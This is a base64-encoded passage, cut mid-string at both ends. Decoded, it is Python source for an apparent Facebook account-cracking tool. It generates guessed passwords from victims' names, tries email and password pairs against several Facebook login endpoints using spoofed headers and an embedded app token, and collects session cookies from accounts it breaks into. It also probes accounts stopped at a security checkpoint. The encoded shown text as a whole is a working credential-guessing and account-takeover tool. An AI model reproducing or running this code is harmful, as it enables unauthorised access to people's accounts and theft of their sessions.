iICIpWzBdK19jaWNpXy5sb3dlcigpLnNwbGl0KCIgIilbMV0pDQogICAgcmV0dXJuIF9hemltdmF1Xw0KDQpkZWYgZ2VuZXJhdGUzKF9jaWNpXyk6DQogICAgX2F6aW12YXVfPVtdDQogICAgZm9yIGkgaW4gX2NpY2lfLnNwbGl0KCIgIik6DQogICAgICAgIGlmIGxlbihpKTwzOmNvbnRpbnVlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBpPWkubG93ZXIoKQ0KICAgICAgICAgICAgaWYgbGVuKGkpPT0zIG9yIGxlbihpKT09NCBvciBsZW4oaSk9PTU6X2F6aW12YXVfLmFwcGVuZChpKyIxMjMiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQ1Iik7X2F6aW12YXVfLmFwcGVuZChpKyJAMTIzIikNCiAgICAgICAgICAgIGVsc2U6X2F6aW12YXVfLmFwcGVuZChpKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyIik7X2F6aW12YXVfLmFwcGVuZChpKyIxMjMiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQ1Iik7X2F6aW12YXVfLmFwcGVuZChpLnVwcGVyKCkrIjEyMyIpO19hemltdmF1Xy5hcHBlbmQoaSsiQCMiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyM0AjIikNCiAgICBfYXppbXZhdV8uYXBwZW5kKF9jaWNpXy5sb3dlcigpKTtfYXppbXZhdV8uYXBwZW5kKF9jaWNpXy5sb3dlcigpLnNwbGl0KCIgIilbMF0rX2NpY2lfLmxvd2VyKCkuc3BsaXQoIiAiKVsxXSk7X2F6aW12YXVfLmFwcGVuZChfY2ljaV8ubG93ZXIoKS5zcGxpdCgiICIpWzBdK19jaWNpXy5sb3dlcigpLnNwbGl0KCIgIilbMV0rIjEyIik7X2F6aW12YXVfLmFwcGVuZChfY2ljaV8ubG93ZXIoKS5zcGxpdCgiICIpWzBdK19jaWNpXy5sb3dlcigpLnNwbGl0KCIgIilbMV0rIjEyMyIpO19hemltdmF1Xy5hcHBlbmQoIjg4OTkwMCIpDQogICAgcmV0dXJuIF9hemltdmF1Xw0KDQoNCmRlZiBnZW5lcmF0ZTQoX2NpY2lfKToNCiAgICBfYXppbXZhdV89W10NCiAgICBwcyA9IF9hemltdmF1X2RhcHVudGFfKCdwYXNzLnR4dCcsJ3InKS5yZWFkKCkNCiAgICBwcCA9IF9hemltdmF1X2RhcHVudGFfKCdkaWdpdHBhc3MudHh0JywncicpLnJlYWQoKQ0KICAgIGZvciBpIGluIF9jaWNpXy5zcGxpdCgiICIpOiAgDQogICAgICAgIGk9aS5sb3dlcigpDQogICAgICAgIGlmIGxlbihpKTwzOmNvbnRpbnVlDQogICAgICAgIGVsaWYgbGVuKGkpPT0zIG9yIGxlbihpKT09NCBvciBsZW4oaSk9PTU6X2F6aW12YXVfLmFwcGVuZChpKyIxMjMiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgZWxzZTpfYXppbXZhdV8uYXBwZW5kKGkpO19hemltdmF1Xy5hcHBlbmQoaSsiMTIzIik7X2F6aW12YXVfLmFwcGVuZChpKyIxMjM0NSIpDQogICAgaWYgcHAgaW4gWycnLCcgJywnICAnXTpwYXNzDQogICAgZWxzZToNCiAgICAgICAgZm9yIGkgaW4gX2NpY2lfLnNwbGl0KCIgIik6ICANCiAgICAgICAgICAgIGk9aS5sb3dlcigpDQogICAgICAgICAgICBmb3IgeCBpbiBwcC5zcGxpdCgnLCcpOl9hemltdmF1Xy5hcHBlbmQoaSt4KQ0KICAgIGlmIHBzIGluIFsnJywnICcsJyAgJ106cGFzcw0KICAgIGVsc2U6DQogICAgICAgIGZvciB6IGluIHBzLnNwbGl0KCcsJyk6X2F6aW12YXVfLmFwcGVuZCh6KQ0KICAgIF9hemltdmF1Xy5hcHBlbmQoX2NpY2lfLmxvd2VyKCkpDQogICAgcmV0dXJuIF9hemltdmF1Xw0KZGVmIHRhbWJhaF9wYXNzKCk6DQogICAgcHJpbnQoJyVzICclKE8pKTtwcmludCgnJXMgWyVz4oCiJXNdICVzRVhBTVBMRSA6ICU3Nzg4OTksMTIzNDU2LDEwMjAzMCw3ODY3ODYnJShILFAsSCxLLEgpKTtjdXkgPSBfY2ljaV9hemltdmF1XygnJXMgWyVz4oCiJXNdICVzRU5URVIgTUFOVUFMIFNVUFBMRU1FTlRBTCBQQVNTIFsxIFdPUkRdIDogJyUoSCxQLEgsSykpO2doID0gX2F6aW12YXVfZGFwdW50YV8oJ3Bhc3MudHh0JywndycpO2doLndyaXRlKGN1eSk7Z2guY2xvc2UNCmRlZiB0YW1iYWhfcGFzc19hbmdrYSgpOg0KICAgIHByaW50KCclcyBbJXPigKIlc10gJXNFWEFNUExFIDogJXMxNDMsNzg2LGdhbWluZyclKEgsUCxILEssSCkpO2NveSA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNFTlRFUiBBRERJVElPTkFMIFBBU1MgQkVISU5EIE5BTUUgOiAnJShILFAsSCxLKSk7eHkgPSBfYXppbXZhdV9kYXB1bnRhXygnZGlnaXRwYXNzLnR4dCcsJ3cnKTt4eS53cml0ZShjb3kpO3h5LmNsb3NlDQogICAgDQojIyMgTG9nZ2VyIENyYWNrDQpkZWYgbG9nX2FwaV8xKGVtLHBhcyk6DQogICAgdWEgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywncicpLnJlYWQoKQ0KICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICBoZWFkZXIgPSB7IngtZmItY29ubmVjdGlvbi1iYW5kd2lkdGgiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAwMDAuMCwgMzAwMDAwMDAuMCkpLCJ4LWZiLXNpbS1obmkiOiBzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsIDQwMDAwKSksIngtZmItbmV0LWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwieC1mYi1jb25uZWN0aW9uLXF1YWxpdHkiOiAiRVhDRUxMRU5UIiwieC1mYi1jb25uZWN0aW9uLXR5cGUiOiAiY2VsbC5DVFJhZGlvQWNjZXNzVGVjaG5vbG9neUhTRFBBIiwidXNlci1hZ2VudCI6IHVhLCJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwieC1mYi1odHRwLWVuZ2luZSI6ICJMaWdlciJ9DQogICAgcmVzcG9uc2UgPSByLmdldCgnaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/Zm9ybWF0PWpzb24mZW1haWw9JyArIGVtICsgJyZwYXNzd29yZD0nICsgcGFzICsgJyZjcmVkZW50aWFsc190eXBlPWRldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZlcnJvcl9kZXRhaWxfdHlwZT1idXR0b25fd2l0aF9kaXNhYmxlZCZzb3VyY2U9ZGV2aWNlX2Jhc2VkX2xvZ2luJm1ldGFfaW5mX2ZibWV0YT0lMjAmY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQ9MCZtZXRob2Q9R0VUJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9jYWxsZXJfY2xhc3M9Y29tLmZhY2Vib29rLmZvcy5oZWFkZXJzdjIuZmI0YW9yY2EuSGVhZGVyc1YyQ29uZmlnRmV0Y2hSZXF1ZXN0SGFuZGxlciZhY2Nlc3NfdG9rZW49MzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1hdXRoZW50aWNhdGUmY3BsPXRydWUnLCBoZWFkZXJzPWhlYWRlcikNCiAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHJlc3BvbnNlLnRleHQgYW5kICdFQUFCJyBpbiByZXNwb25zZS50ZXh0OnJldHVybiB7InN0YXR1cyI6Im9rIiwiZW1haWwiOmVtLCJwYXNzIjpwYXN9DQogICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVzcG9uc2UuanNvbigpWydlcnJvcl9tc2cnXTpyZXR1cm4geyJzdGF0dXMiOiJjcCIsImVtYWlsIjplbSwicGFzcyI6cGFzfQ0KICAgIGVsc2U6cmV0dXJuIHsic3RhdHVzIjoiZXJyb3IiLCJlbWFpbCI6ZW0sInBhc3MiOnBhc30NCmRlZiBsb2dfYXBpXzIoZW0scGFzKToNCiAgICB1YSA9IF9hemltdmF1X2RhcHVudGFfKCd1Z2VudC50eHQnLCdyJykucmVhZCgpDQogICAgciA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgIGhlYWRlciA9IHsieC1mYi1jb25uZWN0aW9uLWJhbmR3aWR0aCI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMDAwMC4wLCAzMDAwMDAwMC4wKSksIngtZmItc2ltLWhuaSI6IHN0cihyYW5kb20ucmFuZGludCgyMDAwMCwgNDAwMDApKSwieC1mYi1uZXQtaG5pIjogc3RyKHJhbmRvbS5yYW5kaW50KDIwMDAwLCA0MDAwMCkpLCJ4LWZiLWNvbm5lY3Rpb24tcXVhbGl0eSI6ICJFWENFTExFTlQiLCJ4LWZiLWNvbm5lY3Rpb24tdHlwZSI6ICJjZWxsLkNUUmFkaW9BY2Nlc3NUZWNobm9sb2d5SFNEUEEiLCJ1c2VyLWFnZW50IjogdWEsImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ4LWZiLWh0dHAtZW5naW5lIjogIkxpZ2VyIn0NCiAgICBwYXJhbSA9IHsnYWNjZXNzX3Rva2VuJzogJzM1MDY4NTUzMTcyOCU3QzYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJywgJ2Zvcm1hdCc6ICdqc29uJywgJ3Nka192ZXJzaW9uJzogJzInLCAnZW1haWwnOiBlbSwgJ2xvY2FsZSc6ICdlbl9VUycsICdwYXNzd29yZCc6IHBhcywgJ3Nkayc6ICdpb3MnLCAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLCAnc2lnJzonM2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnfQ0KICAgIGFwaSA9ICdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbicNCiAgICByZXNwb25zZSA9IHIuZ2V0KGFwaSwgcGFyYW1zPXBhcmFtLCBoZWFkZXJzPWhlYWRlcikNCiAgICBpZiAnc2Vzc2lvbl9rZXknIGluIHJlc3BvbnNlLnRleHQgYW5kICdFQUFCJyBpbiByZXNwb25zZS50ZXh0OnJldHVybiB7InN0YXR1cyI6Im9rIiwiZW1haWwiOmVtLCJwYXNzIjpwYXN9DQogICAgZWxpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcmVzcG9uc2UuanNvbigpWydlcnJvcl9tc2cnXTpyZXR1cm4geyJzdGF0dXMiOiJjcCIsImVtYWlsIjplbSwicGFzcyI6cGFzfQ0KICAgIGVsc2U6cmV0dXJuIHsic3RhdHVzIjoiZXJyb3IiLCJlbWFpbCI6ZW0sInBhc3MiOnBhc30NCmRlZiBsb2dfbWJhc2ljXzEoZW0scGFzKToNCiAgICB1YSA9IF9hemltdmF1X2RhcHVudGFfKCd1Z2VudC50eHQnLCdyJykucmVhZCgpDQogICAgciA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgIHIuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibWJhc2ljLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjoiMSIsInVzZXItYWdlbnQiOnVhLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44LGJuO3E9MC43In0pDQogICAgcCA9IHIuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vIikNCiAgICBiID0gci5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4ucGhwIiwgZGF0YT17ImVtYWlsIjogZW0sICJwYXNzIjogcGFzLCAibG9naW4iOiAic3VibWl0In0pDQogICAgX3Jhd19jb29raWVzXyA9ICgiOyIpLmpvaW4oWyAiJXM9JXMiICUgKGtleSwgdmFsdWUpIGZvciBrZXksIHZhbHVlIGluIHIuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkNCiAgICBpZiAiY191c2VyIiBpbiByLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCk6cmV0dXJuIHsic3RhdHVzIjoib2siLCJlbWFpbCI6ZW0sInBhc3MiOnBhcywiY29va2llcyI6X3Jhd19jb29raWVzX30NCiAgICBlbGlmICJjaGVja3BvaW50IiBpbiByLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCk6cmV0dXJuIHsic3RhdHVzIjoiY3AiLCJlbWFpbCI6ZW0sInBhc3MiOnBhcywiY29va2llcyI6X3Jhd19jb29raWVzX30NCiAgICBlbHNlOnJldHVybiB7InN0YXR1cyI6ImVycm9yIiwiZW1haWwiOmVtLCJwYXNzIjpwYXN9DQpkZWYgbG9nX21iYXNpY18yKGVtLHBhcyk6DQogICAgdWEgPSBfYXppbXZhdV9kYXB1bnRhXygndWdlbnQudHh0JywncicpLnJlYWQoKQ0KICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICByLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCxibjtxPTAuNyJ9KQ0KICAgIHAgPSByLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIpDQogICAgYiA9IGJzNC5CZWF1dGlmdWxTb3VwKHAudGV4dCwiaHRtbC5wYXJzZXIiKQ0KICAgIG1ldGE9IiIuam9pbihiczQucmUuZmluZGFsbCgnZHRzZyI6XHsidG9rZW4iOiIoLio/KSInLHAudGV4dCkpDQogICAgZGF0YT17fQ0KICAgIGZvciBpIGluIGIoImlucHV0Iik6DQogICAgICAgIGlmIGkuZ2V0KCJ2YWx1ZSIpIGlzIE5vbmU6DQogICAgICAgICAgICBpZiBpLmdldCgibmFtZSIpPT0iZW1haWwiOmRhdGEudXBkYXRlKHsiZW1haWwiOmVtfSkNCiAgICAgICAgICAgIGVsaWYgaS5nZXQoIm5hbWUiKT09InBhc3MiOmRhdGEudXBkYXRlKHsicGFzcyI6cGFzfSkNCiAgICAgICAgICAgIGVsc2U6ZGF0YS51cGRhdGUoe2kuZ2V0KCJuYW1lIik6IiJ9KQ0KICAgICAgICBlbHNlOmRhdGEudXBkYXRlKHtpLmdldCgibmFtZSIpOmkuZ2V0KCJ2YWx1ZSIpfSkNCiAgICBkYXRhLnVwZGF0ZSh7ImZiX2R0c2ciOm1ldGEsIm1fc2VzcyI6IiIsIl9fdXNlciI6IjAiLCJfX3JlcSI6ImQiLCJfX2NzciI6IiIsIl9fYSI6IiIsIl9fZHluIjoiIiwiZW5jcGFzcyI6IiJ9KQ0KICAgIHIuaGVhZGVycy51cGRhdGUoeyJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCJ9KQ0KICAgIHBvID0gci5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL2xvZ2luL2FzeW5jLz9yZWZzcmM9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRmxvZ2luJTJGJTNGcmVmJTNEZGJsJmx3dj0xMDAiLGRhdGE9ZGF0YSkudGV4dA0KICAgIF9yYXdfY29va2llc18gPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiByLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgaWYgImNfdXNlciIgaW4gbGlzdChyLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkpOnJldHVybiB7InN0YXR1cyI6Im9rIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOl9yYXdfY29va2llc199DQogICAgZWxpZiAiY2hlY2twb2ludCIgaW4gbGlzdChyLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkpOnJldHVybiB7InN0YXR1cyI6ImNwIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOl9yYXdfY29va2llc199DQogICAgZWxzZTpyZXR1cm4geyJzdGF0dXMiOiJlcnJvciIsImVtYWlsIjplbSwicGFzcyI6cGFzfQ0KZGVmIGxvZ19tb2JpbGVfMShlbSxwYXMpOg0KICAgIHVhID0gX2F6aW12YXVfZGFwdW50YV8oJ3VnZW50LnR4dCcsJ3InKS5yZWFkKCkNCiAgICByID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgci5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjoiMSIsInVzZXItYWdlbnQiOnVhLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImVuLUdCLGVuLVVTO3E9MC45LGVuO3E9MC44LGJuO3E9MC43In0pDQogICAgcCA9IHIuZ2V0KCJodHRwczovL20uZmFjZWJvb2suY29tLyIpDQogICAgYiA9IHIucG9zdCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9sb2dpbi5waHAiLCBkYXRhPXsiZW1haWwiOiBlbSwgInBhc3MiOiBwYXMsICJsb2dpbiI6ICJzdWJtaXQifSkNCiAgICBfcmF3X2Nvb2tpZXNfID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gci5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KICAgIGlmICJjX3VzZXIiIGluIHIuY29va2llcy5nZXRfZGljdCgpLmtleXMoKTpyZXR1cm4geyJzdGF0dXMiOiJvayIsImVtYWlsIjplbSwicGFzcyI6cGFzLCJjb29raWVzIjpfcmF3X2Nvb2tpZXNffQ0KICAgIGVsaWYgImNoZWNrcG9pbnQiIGluIHIuY29va2llcy5nZXRfZGljdCgpLmtleXMoKTpyZXR1cm4geyJzdGF0dXMiOiJjcCIsImVtYWlsIjplbSwicGFzcyI6cGFzLCJjb29raWVzIjpfcmF3X2Nvb2tpZXNffQ0KICAgIGVsc2U6cmV0dXJuIHsic3RhdHVzIjoiZXJyb3IiLCJlbWFpbCI6ZW0sInBhc3MiOnBhc30NCmRlZiBsb2dfbW9iaWxlXzIoZW0scGFzKToNCiAgICB1YSA9IF9hemltdmF1X2RhcHVudGFfKCd1Z2VudC50eHQnLCdyJykucmVhZCgpDQogICAgciA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgIHIuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibS5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCxibjtxPTAuNyJ9KQ0KICAgIHAgPSByLmdldCgiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS8iKQ0KICAgIGIgPSBiczQuQmVhdXRpZnVsU291cChwLnRleHQsImh0bWwucGFyc2VyIikNCiAgICBtZXRhPSIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoJ2R0c2ciOlx7InRva2VuIjoiKC4qPykiJyxwLnRleHQpKQ0KICAgIGRhdGE9e30NCiAgICBmb3IgaSBpbiBiKCJpbnB1dCIpOg0KICAgICAgICBpZiBpLmdldCgidmFsdWUiKSBpcyBOb25lOg0KICAgICAgICAgICAgaWYgaS5nZXQoIm5hbWUiKT09ImVtYWlsIjpkYXRhLnVwZGF0ZSh7ImVtYWlsIjplbX0pDQogICAgICAgICAgICBlbGlmIGkuZ2V0KCJuYW1lIik9PSJwYXNzIjpkYXRhLnVwZGF0ZSh7InBhc3MiOnBhc30pDQogICAgICAgICAgICBlbHNlOmRhdGEudXBkYXRlKHtpLmdldCgibmFtZSIpOiIifSkNCiAgICAgICAgZWxzZTpkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgZGF0YS51cGRhdGUoeyJmYl9kdHNnIjptZXRhLCJtX3Nlc3MiOiIiLCJfX3VzZXIiOiIwIiwiX19yZXEiOiJkIiwiX19jc3IiOiIiLCJfX2EiOiIiLCJfX2R5biI6IiIsImVuY3Bhc3MiOiIifSkNCiAgICByLmhlYWRlcnMudXBkYXRlKHsicmVmZXJlciI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04In0pDQogICAgcG8gPSByLnBvc3QoImh0dHBzOi8vbS5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL2xvZ2luL2FzeW5jLz9yZWZzcmM9aHR0cHMlM0ElMkYlMkZtLmZhY2Vib29rLmNvbSUyRmxvZ2luJTJGJTNGcmVmJTNEZGJsJmx3dj0xMDAiLGRhdGE9ZGF0YSkudGV4dA0KICAgIF9yYXdfY29va2llc18gPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiByLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQogICAgaWYgImNfdXNlciIgaW4gbGlzdChyLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkpOnJldHVybiB7InN0YXR1cyI6Im9rIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOl9yYXdfY29va2llc199DQogICAgZWxpZiAiY2hlY2twb2ludCIgaW4gbGlzdChyLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkpOnJldHVybiB7InN0YXR1cyI6ImNwIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOl9yYXdfY29va2llc199DQogICAgZWxzZTpyZXR1cm4geyJzdGF0dXMiOiJlcnJvciIsImVtYWlsIjplbSwicGFzcyI6cGFzfQ0KDQojIyMgQ2hlY2sgT3BzaQ0KZGVmIGNla19vcHNpKHVzZXIscHcsZm9ybWF0KToNCiAgICBfcmVxX3Nlc18gPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICB0cnk6Y2VrX2Rldl9vcHNpICAgICAgICAgID0gb3Blbignb3B0aW9uXy50eHQnLCdyJykucmVhZCgpDQogICAgZXhjZXB0OmNla19kZXZfb3BzaSAgICAgICA9ICdudWxsJw0KICAgIHRyeTpfYXV0b19jaGFuZ2VfcGFzc18gICAgPSBvcGVuKCdhdXRvX2dhbnRpLnR4dCcsJ3InKS5yZWFkKCkNCiAgICBleGNlcHQ6X2F1dG9fY2hhbmdlX3Bhc3NfID0gJ1llcycNCiAgICB0cnk6Y2VrX3BpbGloX29wc2kgICAgICAgID0gb3BlbignbXVuY3VsX29wc2kudHh0JywncicpLnJlYWQoKQ0KICAgIGV4Y2VwdDpjZWtfcGlsaWhfb3BzaSAgICAgPSAnTm8nDQogICAgX3JlcV9zZXNfLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6Im1iYXNpYy5mYWNlYm9vay5jb20iLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiZW4tR0IsZW4tVVM7cT0wLjkiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLyIsInVzZXItYWdlbnQiOnVhX3hpYW9taX0pO19zb3BfZGV2XyA9IHBhcihfcmVxX3Nlc18uZ2V0KGhvc3QrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiKS50ZXh0LCJodG1sLnBhcnNlciIpO19saW5rdXJsXyA9IF9zb3BfZGV2Xy5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICBmb3IgX2NpY2lfIGluIF9zb3BfZGV2XygiaW5wdXQiKTpkYXRhXzEudXBkYXRlKHtfY2ljaV8uZ2V0KCJuYW1lIik6X2NpY2lfLmdldCgidmFsdWUiKX0pDQogICAgZGF0YV8xLnVwZGF0ZSh7ImVtYWlsIjp1c2VyLCJwYXNzIjpwd30pO191cmxfcG9zdF8gPSBfcmVxX3Nlc18ucG9zdChob3N0K19saW5rdXJsXy5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YV8xKTtfcmVzcG9uc2VfID0gcGFyKF91cmxfcG9zdF8udGV4dCwgImh0bWwucGFyc2VyIikNCiAgICBpZiAiY191c2VyIiBpbiBfcmVxX3Nlc18uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICBpZiAieW91ciBhY2NvdW50IGhhcyBiZWVuIGxvY2tlZCIgaW4gX3VybF9wb3N0Xy50ZXh0OnBhc3MNCiAgICAgICAgZWxzZTpfY29va2llc18gPSAnJy5qb2luKF9yZXFfc2VzXy5jb29raWVzLmdldF9kaWN0KCkpO19yZXN1bHRfb2tfID0gIlxyICVzWyVzS2FjaGktT0slc10gJXMg4oCiICVzJXMlcyAgICAgICAgICAiJShILFAsSCx1c2VyLHB3LHRhaHVuKHVzZXIpLFApO2Nla19hcGsoX3Jlc3VsdF9va18sY3Z0X2Nvb2tpZXMoX2Nvb2tpZXNfKSkNCiAgICBlbGlmICJjaGVja3BvaW50IiBpbiBfcmVxX3Nlc18uY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICBfcmF0eWFfID0gMDtqdW1sYWhfb3BzaSAgPSBbXTtfdGl0bGVfZGV2XyA9IHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cihfcmVzcG9uc2VfKSk7bGlua18yID0gX3Jlc3BvbnNlXy5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSk7bGlzdF9pbnB1dCA9IFsnZmJfZHRzZycsJ2phem9lc3QnLCdjaGVja3BvaW50X2RhdGEnLCdzdWJtaXRbQ29udGludWVdJywnbmgnXQ0KICAgICAgICBmb3IgX2F6aW12YXVfIGluIF9yZXNwb25zZV8oImlucHV0Iik6DQogICAgICAgICAgICBpZiBfYXppbXZhdV8uZ2V0KCJuYW1lIikgaW4gbGlzdF9pbnB1dDpkYXRhXzIudXBkYXRlKHtfYXppbXZhdV8uZ2V0KCJuYW1lIik6X2F6aW12YXVfLmdldCgidmFsdWUiKX0pDQogICAgICAgIF9yZXFfYWN0XyA9IF9yZXFfc2VzXy5wb3N0KGhvc3QrbGl